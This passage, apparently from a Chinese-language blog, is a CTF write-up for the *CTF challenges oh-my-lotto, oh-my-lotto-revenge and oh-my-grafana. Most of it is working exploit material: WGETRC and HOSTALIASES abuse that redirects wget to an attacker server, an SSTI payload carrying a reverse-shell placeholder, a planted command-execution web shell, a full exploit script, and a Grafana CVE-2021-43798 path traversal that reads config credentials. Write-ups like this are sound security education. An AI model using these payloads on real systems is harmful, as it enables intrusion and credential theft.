class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后设置环境变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lotto_key&#x3D;&#39;WGETRC&#39;  lotto_value&#x3D;&#39;&#x2F;app&#x2F;guess&#x2F;forecast.txt&#39;</span><br></pre></td></tr></table></figure>
+
+<p>flask接受：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2fa9f8a31d9a13f44deb8ad909362930.png" alt="image-20220423230020185"></p>
+<h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><h2 id="非预期一-1"><a href="#非预期一-1" class="headerlink" title="非预期一"></a>非预期一</h2><p>利用 WGETRC 配合 <strong>http_proxy</strong> 和 <strong>output_document</strong>，写入SSTI到templates目录，利用SSTI完成RCE。</p>
+<p>output_document 是控制写入的目录</p>
+<p>上传forecast.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http_proxy&#x3D;http:&#x2F;&#x2F;1.116.110.61:80</span><br><span class="line">output_document &#x3D; templates&#x2F;index.html</span><br></pre></td></tr></table></figure>
+
+<p>然后设置返回为SSTI的payload即可</p>
+<p>还是起一个flask</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">    </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    r = <span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;反弹shell&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>设置环境变量</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lotto_key&#x3D;&#39;WGETRC&#39;  lotto_value&#x3D;&#39;&#x2F;app&#x2F;guess&#x2F;forecast.txt&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="非预期二-1"><a href="#非预期二-1" class="headerlink" title="非预期二"></a>非预期二</h2><p>利用 WGETRC 配合 <strong>http_proxy</strong> 和 <strong>output_document</strong>，覆盖本地的wget应用，然后利用wget完成RCE。</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>题目开启debug，一些常见的环境变量利用方法都已经被禁止，通过翻阅Linux环境变量文档 <a target="_blank" rel="noopener" href="http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html">http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html</a> 在Network Settings中发现有 <strong>HOSTALIASES</strong> 可以设置shell的hosts加载文件，利用 <strong>/forecast</strong> 路由可以上传待加载的hosts文件，将 <strong>wget –content-disposition -N lotto 发向lotto的请求转发到自己的域名</strong> </p>
+<p>例如如下hosts文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># hosts</span><br><span class="line">lotto mydomain.com</span><br></pre></td></tr></table></figure>
+
+<p>然后返回内容覆盖为app.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="comment"># 返回的app.py内容</span></span><br><span class="line">    r = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from flask import Flask,request</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string">@app.route(&quot;/test&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="string">def test():</span></span><br><span class="line"><span class="string">    a = request.args.get(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">    a = os.popen(a)</span></span><br><span class="line"><span class="string">    a = a.read()</span></span><br><span class="line"><span class="string">    return str(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="string">    app.run(debug=True,host=&#x27;0.0.0.0&#x27;, port=8080)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=app.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>预期wp提到 gunicorn</p>
+<blockquote>
+<p>因为题目使用gunicorn部署，app.py 在改变的情况下并不会实时加载。但gunicorn使用一种 <code>pre-forked worker</code> 的机制，当某一个worker超时以后，就会让gunicorn重启该worker，让worker超时的POC如下</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timeout 50 nc ip 53000 &amp;</span><br><span class="line">timeout 50 nc ip 53000 &amp;</span><br><span class="line">timeout 50 nc ip 53000</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://124.223.208.221:53000/&#x27;</span></span><br><span class="line">url_upload = base_url + <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = s.post(url=url_upload, proxies=proxies, files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;hosts&quot;</span>, <span class="built_in">open</span>(<span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">url_env = base_url + <span class="string">&#x27;lotto&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;lotto_key&#x27;</span>: <span class="string">&#x27;HOSTALIASES&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lotto_value&#x27;</span>: <span class="string">&#x27;/app/guess/forecast.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url=url_env, data=data)</span><br><span class="line"></span><br><span class="line">subprocess.Popen(<span class="string">&#x27;./exploit.sh&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># os.system(&#x27;./exploit.sh&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">53</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url_shell = base_url + <span class="string">&#x27;test?a=env&#x27;</span></span><br><span class="line">    print(url_shell)</span><br><span class="line">    r = s.get(url_shell)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;*ctf&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><p>之前的CVE-2021-43798，任意文件读，读到配置文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;public&#x2F;plugins&#x2F;alertlist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br></pre></td></tr></table></figure>
+
+<p>然后就找关键字</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># default admin user, created on startup</span><br><span class="line">admin_user &#x3D; admin</span><br><span class="line"></span><br><span class="line"># default admin password, can be changed before first start of grafana,  or in profile settings</span><br><span class="line">admin_password &#x3D; 5f989714e132c9b04d4807dafeb10ade</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Either &quot;mysql&quot;, &quot;postgres&quot; or &quot;sqlite3&quot;, it&#39;s your choice</span><br><span class="line">;type &#x3D; mysql</span><br><span class="line">;host &#x3D; mysql:3306</span><br><span class="line">;name &#x3D; grafana</span><br><span class="line">;user &#x3D; grafana</span><br><span class="line"># If the password contains # or ; you have to wrap it with triple quotes. Ex &quot;&quot;&quot;#password;&quot;&quot;&quot;</span><br><span class="line">;password &#x3D; grafana</span><br></pre></td></tr></table></figure>
+
+<p>登录执行sql语句即可</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/Linux%E6%8F%90%E6%9D%83%20CVE-2021-4034/" rel="prev" title="Linux提权 CVE-2021-4034">
+                  <i class="fa fa-angle-left"></i> Linux提权 CVE-2021-4034
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/sqlmap%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0/" rel="next" title="记一次失败的sqlmap代理池">
+                  记一次失败的sqlmap代理池 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
